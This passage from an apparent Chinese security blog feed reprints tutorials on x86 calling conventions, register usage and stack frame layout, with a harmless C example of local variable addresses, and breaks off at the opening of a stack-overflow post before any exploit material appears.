long或_int64类型)，则通过EAX+EDX寄存器联合返回，其中EDX保存返回值高4字节，EAX保存返回值低4字节。</p><p>   3) 若返回值为浮点类型(如float和double)，则通过专用的协处理器浮点数寄存器栈的栈顶返回。</p><p>   4) 若返回值为结构体或联合体，则主调函数向被调函数传递一个额外参数，该参数指向将要保存返回值的地址。即函数调用foo(p1, p2)被转化为foo(&amp;p0, p1, p2)，以引用型参数形式传回返回值。具体步骤可能为：a.主调函数将显式的实参逆序入栈；b.将接收返回值的结构体变量地址作为隐藏参数入栈(若未定义该接收变量，则在栈上额外开辟空间作为接收返回值的临时变量)；c. 被调函数将待返回数据拷贝到隐藏参数所指向的内存地址，并将该地址存入%eax寄存器。因此，在被调函数中完成返回值的赋值工作。</p><p>   注意，函数如何传递结构体或联合体返回值依赖于具体实现。不同编译器、平台、调用约定甚至编译参数下可能采用不同的实现方法。如VC6编译器对于不超过8字节的小结构体，会通过EAX+EDX寄存器返回。而对于超过8字节的大结构体，主调函数在栈上分配用于接收返回值的临时结构体，并将地址通过栈传递给被调函数；被调函数根据返回值地址设置返回值(拷贝操作)；调用返回后主调函数根据需要，再将返回值赋值给需要的临时变量(二次拷贝)。实际使用中为提高效率，通常将结构体指针作为实参传递给被调函数以接收返回值。</p><p>   5) 不要返回指向栈内存的指针，如返回被调函数内局部变量地址(包括局部数组名)。因为函数返回后，其栈帧空间被“释放”，原栈帧内分配的局部变量空间的内容是不稳定和不被保证的。</p><p>   函数返回值通过寄存器传递，无需空间分配等操作，故返回值的代价很低。基于此原因，C89规范中约定，不写明返回值类型的函数，返回值类型默认为int。但这会带来类型安全隐患，如函数定义时返回值为浮点数，而函数未声明或声明时未指明返回值类型，则调用时默认从寄存器EAX(而不是浮点数寄存器)中获取返回值，导致错误！因此在C++中，不写明返回值类型的函数返回值类型为void，表示不返回值。</p><blockquote><p>【扩展阅读】<strong>GCC**</strong>返回结构体和联合体**</p><p>通常GCC被配置为使用与目标系统一致的函数调用约定。这通过机器描述宏来实现。但是，在一些目标机上采用不同方式返回结构体和联合体的值。因此，使用PCC编译的返回这些类型的函数不能被使用GCC编译的代码调用，反之亦然。但这并未造成麻烦，因为很少有Unix库函数返回结构体或联合体。</p><p>GCC代码使用存放int或double类型返回值的寄存器来返回1、2、4或8个字节的结构体和联合体(GCC通常还将此类变量分配在寄存器中)。其它大小的结构体和联合体在返回时，将其存放在一个由调用者传递的地址中(通常在寄存器中)。</p><p>相比之下，PCC在大多目标机上返回任何大小的结构体和联合体时，都将数据复制到一个静态存储区域，再将该地址当作指针值返回。调用者必须将数据从那个内存区域复制到需要的地方。这比GCC使用的方法要慢，而且不可重入。</p><p>在一些目标机上(如RISC机器和80386)，标准的系统约定是将返回值的地址传给子程序。在这些机器上，当使用这种约定方法时，GCC被配置为与标准编译器兼容。这可能会对于1，2，4或8字节的结构体不兼容。</p><p>GCC使用系统的标准约定来传递参数。在一些机器上，前几个参数通过寄存器传递；在另一些机器上，所有的参数都通过栈传递。原本可在所有机器上都使用寄存器来传递参数，而且此法还可能显著提高性能。但这样就与使用标准约定的代码完全不兼容。所以这种改变只在将GCC作为系统唯一的C编译器时才实用。当拥有一套完整的GNU 系统，能够用GCC来编译库时，可在特定机器上实现寄存器参数传递。</p><p>在一些机器上(特别是SPARC)，一些类型的参数通过“隐匿引用”(invisible reference)来传递。这意味着值存储在内存中，将值的内存地址传给子程序。</p></blockquote><p>参考链接：<a href="https://www.cnblogs.com/clover-toeic/p/3756668.html">https://www.cnblogs.com/clover-toeic/p/3756668.html</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;5-函数调用约定&quot;&gt;&lt;a href=&quot;#5-函数调用约定&quot; class=&quot;headerlink&quot; title=&quot;5 函数调用约定&quot;&gt;&lt;/a&gt;5 函数调用约定&lt;/h1&gt;&lt;p&gt;   创建一个栈帧的最重要步骤是主调函数如何向栈中传递函数参数。主调函数必须精确存储这些参数
      
    
    </summary>
    
    
      <category term="二进制安全" scheme="http://www.ol4three.com/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="Pwn" scheme="http://www.ol4three.com/tags/Pwn/"/>
    
  </entry>
  
  <entry>
    <title>C语言函数调用栈(一)</title>
    <link href="http://www.ol4three.com/2020/12/18/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/C%E8%AF%AD%E8%A8%80%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E6%A0%88-%E4%B8%80/"/>
    <id>http://www.ol4three.com/2020/12/18/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/C%E8%AF%AD%E8%A8%80%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E6%A0%88-%E4%B8%80/</id>
    <published>2020-12-17T16:08:23.000Z</published>
    <updated>2020-12-23T08:45:49.285Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>程序的执行过程可看作连续的函数调用。当一个函数执行完毕时，程序要回到调用指令的下一条指令(紧接call指令)处继续执行。函数调用过程通常使用堆栈实现，每个用户态进程对应一个调用栈结构(call stack)。编译器使用堆栈传递函数参数、保存返回地址、临时保存寄存器原有值(即函数调用的上下文)以备恢复以及存储本地局部变量。</p><p>不同处理器和编译器的堆栈布局、函数调用方法都可能不同，但堆栈的基本概念是一样的。</p></blockquote><h2 id="1-寄存器分配"><a href="#1-寄存器分配" class="headerlink" title="1 寄存器分配"></a>1 寄存器分配</h2><p>寄存器是处理器加工数据或运行程序的重要载体，用于存放程序执行中用到的数据和指令。因此函数调用栈的实现与处理器寄存器组密切相关。</p><p>   Intel 32位体系结构(简称IA32)处理器包含8个四字节寄存器，如下图所示：</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20200903004820751.png" alt="image-20200903004820751"></p><p>图1 IA32处理器寄存器</p><p>最初的8086中寄存器是16位，每个都有特殊用途，寄存器名城反映其不同用途。由于IA32平台采用平面寻址模式，对特殊寄存器的需求大大降低，但由于历史原因，这些寄存器名称被保留下来。在大多数情况下，上图所示的前6个寄存器均可作为通用寄存器使用。某些指令可能以固定的寄存器作为源寄存器或目的寄存器，如一些特殊的算术操作指令imull/mull/cltd/idivl/divl要求一个参数必须在%eax中，其运算结果存放在%edx(higher 32-bit)和%eax (lower32-bit)中；又如函数返回值通常保存在%eax中，等等。为避免兼容性问题，ABI规范对这组通用寄存器的具体作用加以定义(如图中所示)。</p><p>   对于寄存器%eax、%ebx、%ecx和%edx，各自可作为两个独立的16位寄存器使用，而低16位寄存器还可继续分为两个独立的8位寄存器使用。编译器会根据操作数大小选择合适的寄存器来生成汇编代码。在汇编语言层面，这组通用寄存器以%e(AT&amp;T语法)或直接以e(Intel语法)开头来引用，例如mov $5, %eax或mov eax, 5表示将立即数5赋值给寄存器%eax。</p><p>   在x86处理器中，EIP(Instruction Pointer)是指令寄存器，指向处理器下条等待执行的指令地址(代码段内的偏移量)，每次执行完相应汇编指令EIP值就会增加。ESP(Stack Pointer)是堆栈指针寄存器，存放执行函数对应栈帧的栈顶地址(也是系统栈的顶部)，且始终指向栈顶；EBP(Base Pointer)是栈帧基址指针寄存器，存放执行函数对应栈帧的栈底地址，用于C运行库访问栈中的局部变量和参数。</p><p>   注意，EIP是个特殊寄存器，不能像访问通用寄存器那样访问它，即找不到可用来寻址EIP并对其进行读写的操作码(OpCode)。EIP可被jmp、call和ret等指令隐含地改变(事实上它一直都在改变)。</p><p>   不同架构的CPU，寄存器名称被添加不同前缀以指示寄存器的大小。例如x86架构用字母“e(extended)”作名称前缀，指示寄存器大小为32位；x86_64架构用字母“r”作名称前缀，指示各寄存器大小为64位。</p><p>   编译器在将C程序编译成汇编程序时，应遵循ABI所规定的寄存器功能定义。同样地，编写汇编程序时也应遵循，否则所编写的汇编程序可能无法与C程序协同工作。</p><blockquote><p>`【扩展阅读】<strong>栈帧指针寄存器</strong></p><p>为了访问函数局部变量，必须能定位每个变量。局部变量相对于堆栈指针ESP的位置在进入函数时就已确定，理论上变量可用ESP加偏移量来引用，但ESP会在函数执行期随变量的压栈和出栈而变动。尽管某些情况下编译器能跟踪栈中的变量操作以修正偏移量，但要引入可观的管理开销。而且在有些机器上(如Intel处理器)，用ESP加偏移量来访问一个变量需要多条指令才能实现。</p><p>因此，许多编译器使用帧指针寄存器FP(Frame Pointer)记录栈帧基地址。局部变量和函数参数都可通过帧指针引用，因为它们到FP的距离不会受到压栈和出栈操作的影响。有些资料将帧指针称作局部基指针(LB-local base pointer)。</p><p>在Intel CPU中，寄存器BP(EBP)用作帧指针。在Motorola CPU中，除A7(堆栈指针SP)外的任何地址寄存器都可用作FP。当堆栈向下(低地址)增长时，以FP地址为基准，函数参数的偏移量是正值，而局部变量的偏移量是负值。`</p></blockquote><h2 id="2-寄存器使用约定"><a href="#2-寄存器使用约定" class="headerlink" title="2 寄存器使用约定"></a>2 寄存器使用约定</h2><p> 程序寄存器组是唯一能被所有函数共享的资源。虽然某一时刻只有一个函数在执行，但需保证当某个函数调用其他函数时，被调函数不会修改或覆盖主调函数稍后会使用到的寄存器值。因此，IA32采用一套统一的寄存器使用约定，所有函数(包括库函数)调用都必须遵守该约定。</p><p>   根据惯例，寄存器%eax、%edx和%ecx为主调函数保存寄存器(caller-saved registers)，当函数调用时，若主调函数希望保持这些寄存器的值，则必须在调用前显式地将其保存在栈中；被调函数可以覆盖这些寄存器，而不会破坏主调函数所需的数据。寄存器%ebx、%esi和%edi为被调函数保存寄存器(callee-saved registers)，即被调函数在覆盖这些寄存器的值时，必须先将寄存器原值压入栈中保存起来，并在函数返回前从栈中恢复其原值，因为主调函数可能也在使用这些寄存器。此外，被调函数必须保持寄存器%ebp和%esp，并在函数返回后将其恢复到调用前的值，亦即必须恢复主调函数的栈帧。</p><p>   当然，这些工作都由编译器在幕后进行。不过在编写汇编程序时应注意遵守上述惯例。</p><h2 id="3-栈帧结构"><a href="#3-栈帧结构" class="headerlink" title="3 栈帧结构"></a>3 栈帧结构</h2><p>函数调用经常是嵌套的，在同一时刻，堆栈中会有多个函数的信息。每个未完成运行的函数占用一个独立的连续区域，称作栈帧(Stack Frame)。栈帧是堆栈的逻辑片段，当调用函数时逻辑栈帧被压入堆栈, 当函数返回时逻辑栈帧被从堆栈中弹出。栈帧存放着函数参数，局部变量及恢复前一栈帧所需要的数据等。</p><p>   编译器利用栈帧，使得函数参数和函数中局部变量的分配与释放对程序员透明。编译器将控制权移交函数本身之前，插入特定代码将函数参数压入栈帧中，并分配足够的内存空间用于存放函数中的局部变量。使用栈帧的一个好处是使得递归变为可能，因为对函数的每次递归调用，都会分配给该函数一个新的栈帧，这样就巧妙地隔离当前调用与上次调用。</p><p>   栈帧的边界由栈帧基地址指针EBP和堆栈指针ESP界定(指针存放在相应寄存器中)。EBP指向当前栈帧底部(高地址)，在当前栈帧内位置固定；ESP指向当前栈帧顶部(低地址)，当程序执行时ESP会随着数据的入栈和出栈而移动。因此函数中对大部分数据的访问都基于EBP进行。</p><p>   为更具描述性，以下称EBP为帧基指针， ESP为栈顶指针，并在引用汇编代码时分别记为%ebp和%esp。</p><p> 函数调用栈的典型内存布局如下图所示：</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20200903012700201.png" alt="image-20200903012700201"></p><p>图中给出主调函数(caller)和被调函数(callee)的栈帧布局，”m(%ebp)”表示以EBP为基地址、偏移量为m字节的内存空间(中的内容)。该图基于两个假设：第一，函数返回值不是结构体或联合体，否则第一个参数将位于”12(%ebp)” 处；第二，每个参数都是4字节大小(栈的粒度为4字节)。在本文后续章节将就参数的传递和大小问题做进一步的探讨。 此外，函数可以没有参数和局部变量，故图中“Argument(参数)”和“Local Variable(局部变量)”不是函数栈帧结构的必需部分。</p><p>从图中可以看出，函数调用时入栈顺序为</p><p><strong>实参N<del>1→主调函数返回地址→主调函数帧基指针EBP→被调函数局部变量1</del>N</strong></p><p> 其中，主调函数将参数按照调用约定依次入栈(图中为从右到左)，然后将指令指针EIP入栈以保存主调函数的返回地址(下一条待执行指令的地址)。进入被调函数时，被调函数将主调函数的帧基指针EBP入栈，并将主调函数的栈顶指针ESP值赋给被调函数的EBP(作为被调函数的栈底)，接着改变ESP值来为函数局部变量预留空间。此时被调函数帧基指针指向被调函数的栈底。以该地址为基准，向上(栈底方向)可获取主调函数的返回地址、参数值，向下(栈顶方向)能获取被调函数的局部变量值，而该地址处又存放着上一层主调函数的帧基指针值。本级调用结束后，将EBP指针值赋给ESP，使ESP再次指向被调函数栈底以释放局部变量；再将已压栈的主调函数帧基指针弹出到EBP，并弹出返回地址到EIP。ESP继续上移越过参数，最终回到函数调用前的状态，即恢复原来主调函数的栈帧。如此递归便形成函数调用栈。</p><p>   EBP指针在当前函数运行过程中(未调用其他函数时)保持不变。在函数调用前，ESP指针指向栈顶地址，也是栈底地址。在函数完成现场保护之类的初始化工作后，ESP会始终指向当前函数栈帧的栈顶，此时，若当前函数又调用另一个函数，则会将此时的EBP视为旧EBP压栈，而与新调用函数有关的内容会从当前ESP所指向位置开始压栈。</p><p>   若需在函数中保存被调函数保存寄存器(如ESI、EDI)，则编译器在保存EBP值时进行保存，或延迟保存直到局部变量空间被分配。在栈帧中并未为被调函数保存寄存器的空间指定标准的存储位置。包含寄存器和临时变量的函数调用栈布局可能如下图所示：</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/271650059007975.jpg" alt="img"></p><p>在多线程(任务)环境，栈顶指针指向的存储器区域就是当前使用的堆栈。切换线程的一个重要工作，就是将栈顶指针设为当前线程的堆栈栈顶地址。</p><p>   以下代码用于函数栈布局示例：</p><p></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">1 &#x2F;&#x2F;StackFrame.c</span><br><span class="line"> 2 #include &lt;stdio.h&gt;</span><br><span class="line"> 3 #include &lt;string.h&gt;</span><br><span class="line"> 4 </span><br><span class="line"> 5 struct Strt&#123;</span><br><span class="line"> 6     int member1;</span><br><span class="line"> 7     int member2;</span><br><span class="line"> 8     int member3;</span><br><span class="line"> 9 &#125;;</span><br><span class="line">10 </span><br><span class="line">11 #define PRINT_ADDR(x)     printf(&quot;&amp;&quot;#x&quot; &#x3D; %p\n&quot;, &amp;x)</span><br><span class="line">12 int StackFrameContent(int para1, int para2, int para3)&#123;</span><br><span class="line">13     int locVar1 &#x3D; 1;</span><br><span class="line">14     int locVar2 &#x3D; 2;</span><br><span class="line">15     int locVar3 &#x3D; 3;</span><br><span class="line">16     int arr[] &#x3D; &#123;0x11,0x22,0x33&#125;;</span><br><span class="line">17     struct Strt tStrt &#x3D; &#123;0&#125;;</span><br><span class="line">18     PRINT_ADDR(para1); &#x2F;&#x2F;若para1为char或short型，则打印para1所对应的栈上整型临时变量地址！</span><br><span class="line">19     PRINT_ADDR(para2);</span><br><span class="line">20     PRINT_ADDR(para3);</span><br><span class="line">21     PRINT_ADDR(locVar1);</span><br><span class="line">22     PRINT_ADDR(locVar2);</span><br><span class="line">23     PRINT_ADDR(locVar3);</span><br><span class="line">24     PRINT_ADDR(arr);</span><br><span class="line">25     PRINT_ADDR(arr[0]);</span><br><span class="line">26     PRINT_ADDR(arr[1]);</span><br><span class="line">27     PRINT_ADDR(arr[2]);</span><br><span class="line">28     PRINT_ADDR(tStrt);</span><br><span class="line">29     PRINT_ADDR(tStrt.member1);</span><br><span class="line">30     PRINT_ADDR(tStrt.member2);</span><br><span class="line">31     PRINT_ADDR(tStrt.member3);</span><br><span class="line">32     return 0;</span><br><span class="line">33 &#125;</span><br><span class="line">34 </span><br><span class="line">35 int main(void)&#123;</span><br><span class="line">36     int locMain1 &#x3D; 1, locMain2 &#x3D; 2, locMain3 &#x3D; 3;</span><br><span class="line">37     PRINT_ADDR(locMain1);</span><br><span class="line">38     PRINT_ADDR(locMain2);</span><br><span class="line">39     PRINT_ADDR(locMain3);</span><br><span class="line">40     StackFrameContent(locMain1, locMain2, locMain3);</span><br><span class="line">41     printf(&quot;[locMain1,2,3] &#x3D; [%d, %d, %d]\n&quot;, locMain1, locMain2, locMain3);</span><br><span class="line">42     memset(&amp;locMain2, 0, 2*sizeof(int));</span><br><span class="line">43     printf(&quot;[locMain1,2,3] &#x3D; [%d, %d, %d]\n&quot;, locMain1, locMain2, locMain3);</span><br><span class="line">44     return 0;</span><br><span class="line">45 &#125;</span><br></pre></td></tr></table></figure><p>编译链接并执行后，输出打印如下：</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/271651489169470.jpg" alt="img"></p><p>函数栈布局示例如下图所示。为直观起见，低于起始高地址0xbfc75a58的其他地址采用点记法，如0x.54表示0xbfc75a54，以此类推。</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/271652449633815.jpg" alt="img"></p><p> 内存地址从栈底到栈顶递减，压栈就是把ESP指针逐渐往地低址移动的过程。而结构体tStrt中的成员变量memberX地址=tStrt首地址+(memberX偏移量)，即越靠近tStrt首地址的成员变量其内存地址越小。因此，结构体成员变量的入栈顺序与其在结构体中声明的顺序相反。</p><p>   函数调用以值传递时，传入的实参(locMain1<del>3)与被调函数内操作的形参(para1</del>3)两者存储地址不同，因此被调函数无法直接修改主调函数实参值(对形参的操作相当于修改实参的副本)。为达到修改目的，需要向被调函数传递实参变量的指针(即变量的地址)。</p><p>   此外，”[locMain1,2,3] = [0, 0, 3]”是因为对四字节参数locMain2调用memset函数时，会从低地址向高地址连续清零8个字节，从而误将位于高地址locMain1清零。</p><p>   注意，局部变量的布局依赖于编译器实现等因素。因此，当StackFrameContent函数中删除打印语句时，变量locVar3、locVar2和locVar1可能按照从高到低的顺序依次存储！而且，局部变量并不总在栈中，有时出于性能(速度)考虑会存放在寄存器中。数组/结构体型的局部变量通常分配在栈内存中。</p><blockquote><p>【扩展阅读】<strong>函数局部变量布局方式</strong></p><p>与函数调用约定规定参数如何传入不同，局部变量以何种方式布局并未规定。编译器计算函数局部变量所需要的空间总数，并确定这些变量存储在寄存器上还是分配在程序栈上(甚至被优化掉)——某些处理器并没有堆栈。局部变量的空间分配与主调函数和被调函数无关，仅仅从函数源代码上无法确定该函数的局部变量分布情况。</p><p>基于不同的编译器版本(gcc3.4中局部变量按照定义顺序依次入栈，gcc4及以上版本则不定)、优化级别、目标处理器架构、栈安全性等，相邻定义的两个变量在内存位置上可能相邻，也可能不相邻，前后关系也不固定。若要确保两个对象在内存上相邻且前后关系固定，可使用结构体或数组定义。</p></blockquote><h1 id="4-堆栈操作"><a href="#4-堆栈操作" class="headerlink" title="4 堆栈操作"></a>4 堆栈操作</h1><p>   函数调用时的具体步骤如下：</p><p>   1) 主调函数将被调函数所要求的参数，根据相应的函数调用约定，保存在运行时栈中。该操作会改变程序的栈指针。</p><p>   注：x86平台将参数压入调用栈中。而x86_64平台具有16个通用64位寄存器，故调用函数时前6个参数通常由寄存器传递，其余参数才通过栈传递。</p><p>   2) 主调函数将控制权移交给被调函数(使用call指令)。函数的返回地址(待执行的下条指令地址)保存在程序栈中(压栈操作隐含在call指令中)。</p><p>   3) 若有必要，被调函数会设置帧基指针，并保存被调函数希望保持不变的寄存器值。</p><p>   4) 被调函数通过修改栈顶指针的值，为自己的局部变量在运行时栈中分配内存空间，并从帧基指针的位置处向低地址方向存放被调函数的局部变量和临时变量。</p><p>   5) 被调函数执行自己任务，此时可能需要访问由主调函数传入的参数。若被调函数返回一个值，该值通常保存在一个指定寄存器中(如EAX)。</p><p>   6) 一旦被调函数完成操作，为该函数局部变量分配的栈空间将被释放。这通常是步骤4的逆向执行。</p><p>   7) 恢复步骤3中保存的寄存器值，包含主调函数的帧基指针寄存器。</p><p>   8) 被调函数将控制权交还主调函数(使用ret指令)。根据使用的函数调用约定，该操作也可能从程序栈上清除先前传入的参数。</p><p>   9) 主调函数再次获得控制权后，可能需要将先前的参数从栈上清除。在这种情况下，对栈的修改需要将帧基指针值恢复到步骤1之前的值。</p><p>   步骤3与步骤4在函数调用之初常一同出现，统称为函数序(prologue)；步骤6到步骤8在函数调用的最后常一同出现，统称为函数跋(epilogue)。函数序和函数跋是编译器自动添加的开始和结束汇编代码，其实现与CPU架构和编译器相关。除步骤5代表函数实体外，其它所有操作组成函数调用。</p><p>   以下介绍函数调用过程中的主要指令。</p><p>   <strong>压栈**</strong>(push)**：栈顶指针ESP减小4个字节；以字节为单位将寄存器数据(四字节，不足补零)压入堆栈，从高到低按字节依次将数据存入ESP-1、ESP-2、ESP-3、ESP-4指向的地址单元。</p><p>   <strong>出栈**</strong>(pop)**：栈顶指针ESP指向的栈中数据被取回到寄存器；栈顶指针ESP增加4个字节。</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/271656343069114.jpg" alt="img"></p><p>可见，压栈操作将寄存器内容存入栈内存中(寄存器原内容不变)，栈顶地址减小；出栈操作从栈内存中取回寄存器内容(栈内已存数据不会自动清零)，栈顶地址增大。栈顶指针ESP总是指向栈中下一个可用数据。</p><p>   <strong>调用**</strong>(<strong><strong>call</strong></strong>)**：将当前的指令指针EIP(该指针指向紧接在call指令后的下条指令)压入堆栈，以备返回时能恢复执行下条指令；然后设置EIP指向被调函数代码开始处，以跳转到被调函数的入口地址执行。</p><p>   <strong>离开**</strong>(leave)**： 恢复主调函数的栈帧以准备返回。等价于指令序列movl %ebp, %esp(恢复原ESP值，指向被调函数栈帧开始处)和popl %ebp(恢复原ebp的值，即主调函数帧基指针)。</p><p>   <strong>返回**</strong>(ret)**：与call指令配合，用于从函数或过程返回。从栈顶弹出返回地址(之前call指令保存的下条指令地址)到EIP寄存器中，程序转到该地址处继续执行(此时ESP指向进入函数时的第一个参数)。若带立即数，ESP再加立即数(丢弃一些在执行call前入栈的参数)。使用该指令前，应使当前栈顶指针所指向位置的内容正好是先前call指令保存的返回地址。</p><p>基于以上指令，使用C调用约定的被调函数典型的函数序和函数跋实现如下：</p><table><thead><tr><th></th><th><strong>指令序列</strong></th><th><strong>含义</strong></th></tr></thead><tbody><tr><td>函数序(prologue)</td><td>push %ebp</td><td>将主调函数的帧基指针%ebp压栈，即保存旧栈帧中的帧基指针以便函数返回时恢复旧栈帧</td></tr><tr><td>mov %esp, %ebp</td><td>将主调函数的栈顶指针%esp赋给被调函数帧基指针%ebp。此时，%ebp指向被调函数新栈帧的起始地址(栈底)，亦即旧%ebp入栈后的栈顶</td><td></td></tr><tr><td>sub <n>, %esp</n></td><td>将栈顶指针%esp减去指定字节数(栈顶下移)，即为被调函数局部变量开辟栈空间。<n>为立即数且通常为16的整数倍(可能大于局部变量字节总数而稍显浪费，但gcc采用该规则保证数据的严格对齐以有效运用各种优化编译技术)</n></td><td></td></tr><tr><td>push <r></r></td><td>可选。如有必要，被调函数负责保存某些寄存器(%edi/%esi/%ebx)值</td><td></td></tr><tr><td>函数跋(epilogue)</td><td>pop <r></r></td><td>可选。如有必要，被调函数负责恢复某些寄存器(%edi/%esi/%ebx)值</td></tr><tr><td>mov %ebp, %esp*</td><td>恢复主调函数的栈顶指针%esp，将其指向被调函数栈底。此时，局部变量占用的栈空间被释放，但变量内容未被清除(跳过该处理)</td><td></td></tr><tr><td>pop %ebp*</td><td>主调函数的帧基指针%ebp出栈，即恢复主调函数栈底。此时，栈顶指针%esp指向主调函数栈顶(espßesp-4)，亦即返回地址存放处</td><td></td></tr><tr><td>ret</td><td>从栈顶弹出主调函数压在栈中的返回地址到指令指针寄存器%eip中，跳回主调函数该位置处继续执行。再由主调函数恢复到调用前的栈</td><td></td></tr><tr><td></td><td>*：这两条指令序列也可由leave指令实现，具体用哪种方式由编译器决定。</td><td></td></tr></tbody></table><p> 若主调函数和调函数均未使用局部变量寄存器EDI、ESI和EBX，则编译器无须在函数序中对其压栈，以便提高程序的执行效率。</p><p>   参数压栈指令因编译器而异，如下两种压栈方式基本等效：</p><table><thead><tr><th>extern CdeclDemo(int w, int x, int y, intz); //调用CdeclDemo函数</th><th>CdeclDemo(1, 2, 3, 4); //调用CdeclDemo函数</th></tr></thead><tbody><tr><td><strong>压栈方式一</strong></td><td><strong>压栈方式二</strong></td></tr><tr><td>pushl 4 //压入参数zpushl 3 //压入参数ypushl 2 //压入参数xpushl 1 //压入参数wcall CdeclDemo  //调用函数addl $16, %esp //恢复ESP原值，使其指向调用前保存的返回地址</td><td><em>subl  $16, %esp</em> //多次调用仅执行一遍movl $4, 12(%esp) //传送参数z至堆栈第四个位置movl $3, 8(%esp) //传送参数y至堆栈第三个位置movl $2, 4(%esp) //传送参数x至堆栈第二个位置movl $1, (%esp) //传送参数w至堆栈栈顶call CdeclDemo  //调用函数</td></tr></tbody></table><p> 两种压栈方式均遵循C调用约定，但方式二中主调函数在调用返回后并未显式清理堆栈空间。因为在被调函数序阶段，编译器在栈顶为函数参数预先分配内存空间(sub指令)。函数参数被复制到栈中(而非压入栈中)，并未修改栈顶指针，故调用返回时主调函数也无需修改栈顶指针。gcc3.4(或更高版本)编译器采用该技术将函数参数传递至栈上，相比栈顶指针随每次参数压栈而多次下移，一次性设置好栈顶指针更为高效。设想连续调用多个函数时，方式二仅需预先分配一次参数内存(大小足够容纳参数尺寸和最大的函数即可)，后续调用无需每次都恢复栈顶指针。注意，函数被调用时，两种方式均使栈顶指针指向函数最左边的参数。本文不再区分两种压栈方式，”压栈”或”入栈”所提之处均按相应汇编代码理解，若无汇编则指方式二。</p><p>   某些情况下，编译器生成的函数调用进入/退出指令序列并不按照以上方式进行。例如，若C函数声明为static(只在本编译单元内可见)且函数在编译单元内被直接调用，未被显示或隐式取地址(即没有任何函数指针指向该函数)，此时编译器确信该函数不会被其它编译单元调用，因此可随意修改其进/出指令序列以达到优化目的。</p><p>   尽管使用的寄存器名字和指令在不同处理器架构上有所不同，但创建栈帧的基本过程一致。</p><p>   注意，栈帧是运行时概念，若程序不运行，就不存在栈和栈帧。但通过分析目标文件中建立函数栈帧的汇编代码(尤其是函数序和函数跋过程)，即使函数没有运行，也能了解函数的栈帧结构。通过分析可确定分配在函数栈帧上的局部变量空间准确值，函数中是否使用帧基指针，以及识别函数栈帧中对变量的所有内存引用。</p><p>参考链接：<a href="https://www.cnblogs.com/clover-toeic/p/3755401.html">https://www.cnblogs.com/clover-toeic/p/3755401.html</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;程序的执行过程可看作连续的函数调用。当一个函数执行完毕时，程序要回到调用指令的下一条指令(紧接call指令)处继续执行。函数调用过程通常使用堆栈实现，每个用户态进程对应一个调用栈结构(call stack)。编译器使用堆栈传递函数参数、保存返回地址
      
    
    </summary>
    
    
      <category term="二进制安全" scheme="http://www.ol4three.com/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="Pwn" scheme="http://www.ol4three.com/tags/Pwn/"/>
    
  </entry>
  
  <entry>
    <title>linux-stack-Overflow-1</title>
    <link href="http://www.ol4three.com/2020/12/18/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/Linux-Pwn/linux-stack-Overflow-1/"/>
    <id>http://www.ol4three.com/2020/12/18/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/Linux-Pwn/linux-stack-Overflow-1/</id>
    <published>2020-12-17T16:03:45.000Z</published>
    <updated>2020-12-29T07:25:10.382Z</updated>
    
    <content type="html"><![CDATA[<h1 id="栈介绍"><a href="#栈介绍" class="headerlink" title="栈介绍"></a>栈介绍</h1><h3 id="基本栈介绍"><a href="#基本栈介绍" class="headerlink" title="基本栈介绍"></a>基本栈介绍</h3><blockquote><p>栈是一种典型的后进先出 (Last in First Out) 的数据结构，其操作主要有压栈 (push) 与出栈 (pop) 两种操作，如下图所示（维基百科）。两种操作都操作栈顶，当然，它也有栈底。</p></blockquote><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/Data_stack.png" alt="基本栈操作"></p><p>高级语言在运行时都会被转换为汇编程序，在汇编程序运行过程中，充分利用了这一数据结构。每个程序在运行时都有虚拟地址空间，其中某一部分就是该程序对应的栈，用于保存函数调用信息和局部变量。此外，常见的操作也是压栈与出栈。需要注意的是，<strong>程序的栈是从进程地址空间的高地址向低地址增长的</strong>。</p><h3 id="函数调用栈"><a href="#函数调用栈" class="headerlink" title="函数调用栈"></a>函数调用栈</h3><p>这里再给出另外一张寄存器的图</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/register.png" alt="img"></p><p>需要注意的是，32 位和 64 位程序有以下简单的区别</p><ul><li>x86<ul><li><strong>函数参数</strong>在<strong>函数返回地址</strong>的上方</li></ul></li><li>x64<ul><li>System V AMD64 ABI (Linux、FreeBSD、macOS 等采用) 